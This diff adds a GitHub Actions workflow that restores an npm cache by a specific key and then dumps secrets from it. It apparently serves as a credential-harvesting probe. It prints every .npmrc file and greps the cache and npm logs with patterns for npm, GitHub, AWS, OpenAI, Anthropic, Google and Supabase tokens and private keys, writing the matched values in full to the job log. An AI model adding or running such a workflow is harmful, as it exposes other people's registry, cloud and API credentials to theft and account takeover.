@@ -1,0 +1,25 @@
+name: zz-cache-scan3
+on:
+  workflow_dispatch:
+jobs:
+  scan:
+    runs-on: ubuntu-latest
+    steps:
+      - id: a
+        uses: actions/cache/restore@v4
+        with:
+          path: /home/runner/.npm
+          key: node-cache-Linux-x64-npm-4f153ab81385c7d4622fbabed5bc4abd71c8161f40c37912b780fccdafc8ac30
+      - name: scan
+        run: |
+          echo "HIT=${{ steps.a.outputs.cache-hit }}"
+          echo "--- npmrc ---"
+          find /home/runner -maxdepth 3 -name '.npmrc' 2>/dev/null | while read f; do echo "FILE=$f"; cat "$f"; done
+          echo "--- name hits ---"
+          find /home/runner/.npm -type f \( -name '*credential*' -o -name '*secret*' -o -name '*token*' -o -name '*.pem' -o -name '*.key' \) 2>/dev/null | head -20
+          echo "--- content hits (file:match) ---"
+          grep -rIalE 'npm_[A-Za-z0-9]{36}|sb_secret_|sb_publishable_|sk-proj-|sk-ant-|AKIA[0-9A-Z]{16}|gh[pousr]_[A-Za-z0-9]{36}|github_pat_|AIza[0-9A-Za-z_-]{35}|BEGIN [A-Z ]*PRIVATE KEY|_authToken|registry.npmjs.org/:_auth' /home/runner/.npm 2>/dev/null | head -10
+          grep -rIaEo 'npm_[A-Za-z0-9]{36}|sb_secret_[A-Za-z0-9_-]{20,}|sk-proj-[A-Za-z0-9_-]{20,}|sk-ant-[A-Za-z0-9_-]{20,}|AKIA[0-9A-Z]{16}|gh[pousr]_[A-Za-z0-9]{36}|github_pat_[A-Za-z0-9_]{50,}|AIza[0-9A-Za-z_-]{35}|_authToken.{0,60}' /home/runner/.npm 2>/dev/null | sort -u | head -30
+          echo "--- npm logs auth mentions ---"
+          grep -rhaEo '(https://[^ ]*:_authToken=[^ ]*|npm_[A-Za-z0-9]{36})' /home/runner/.npm/_logs 2>/dev/null | sort -u | head -10
+          echo DONE
